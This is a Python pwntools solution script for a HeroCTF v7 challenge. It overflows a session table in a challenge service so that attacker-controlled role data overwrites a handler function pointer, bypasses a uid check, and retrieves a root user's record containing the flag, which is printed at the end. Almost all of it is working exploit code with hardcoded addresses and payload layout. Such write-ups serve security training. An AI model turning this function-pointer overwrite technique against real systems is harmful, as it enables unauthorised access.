#!/usr/bin/env python3
"""
Identity Challenge - HeroCTF v7
Exploit: Session Table Overflow to Handler Table Corruption

The vulnerability is in securityd's session management. When 9+ TCC sessions
are created, session 8 overlaps with the handler function pointer table.
By controlling the role data in session 8, we can overwrite the GET handler
(handler[4]) with op_check_add, which checks arg1 (id) against 666 instead
of arg2 (system_uid). Since id=1337 != 666, the check passes.

Memory layout:
- g_state at 0x4051a0 (sessions 0-7)
- Session 8 at 0x405d20 (overlaps handler table)
- handler[4] (GET) at 0x405d40
- Session 8 role field starts at 0x405d2c
- Offset to handler[4] = 20 bytes into role field
"""

import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

from pwn import *
from tqdm import tqdm

# Configuration
LOCAL = True
HOST = "localhost" if LOCAL else sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = 5555

context.log_level = "error"  # Quiet pwntools


def create_tcc_session(host, port, user_id, role):
    """Create a TCC session by triggering UPDATE with uid=666"""
    r = remote(host, port)
    r.sendline(f"UPDATE {user_id} test 666 test@test.com {role}".encode())
    return r


def exploit():
    OP_CHECK_ADD = 0x00401E97

    role_payload = b"A" * 20  # padding to handler[4]
    role_payload += p64(OP_CHECK_ADD)  # overwrite handler[4]
    role_payload += b"B" * (100 - len(role_payload))

    print(f"[*] Target: {HOST}:{PORT}")
    print(f"[*] Handler address: {hex(OP_CHECK_ADD)}")

    # Step 1: Create a test user
    print("[*] Creating test user...")
    r = remote(HOST, PORT)
    r.sendline(b"ADD testuser 999 test@test.com testrole")
    resp = r.recvline()
    user_id = int(resp.decode().split("id=")[1].strip())
    print(f"[+] Created user id={user_id}")
    r.close()

    # Step 2: Fill TCC sessions 0-7 concurrently
    print("[*] Filling TCC sessions 0-7...")
    connections = []
    with ThreadPoolExecutor(max_workers=8) as executor:
        futures = []
        for i in tqdm(range(8), desc="Creating sessions"):
            future = executor.submit(
                create_tcc_session, HOST, PORT, user_id, f"role{i}"
            )
            futures.append(future)

        for future in as_completed(futures):
            connections.append(future.result())

    print(f"[+] Created {len(connections)} TCC sessions")

    # Step 3: Create session 8 with handler overwrite payload
    print("[*] Creating session 8 with handler overwrite...")
    r_exploit = remote(HOST, PORT)
    cmd = f"UPDATE {user_id} test 666 test@test.com ".encode() + role_payload
    r_exploit.sendline(cmd)

    # Step 4: Read user 1337 (root) - should now bypass the uid check
    print("[*] Reading user 1337 (root)...")
    r_read = remote(HOST, PORT)
    r_read.sendline(b"GET 1337")

    try:
        result = r_read.recvline(timeout=3)
        print(f"[+] Result: {result.decode().strip()}")

        # Extract flag from email field
        if b"email=" in result:
            email = result.split(b"email=")[1].split(b" ")[0]
            print(f"[+] FLAG: {email.decode()}")
    except Exception as e:
        print(f"[-] Error: {e}")

    # Cleanup
    for r in connections:
        r.close()
    r_exploit.close()
    r_read.close()


if __name__ == "__main__":
    if len(sys.argv) > 1:
        HOST = sys.argv[1]
        LOCAL = False
    if len(sys.argv) > 2:
        PORT = int(sys.argv[2])

    exploit()

# Hero{3d7595fe172ef52a99fdc60d}
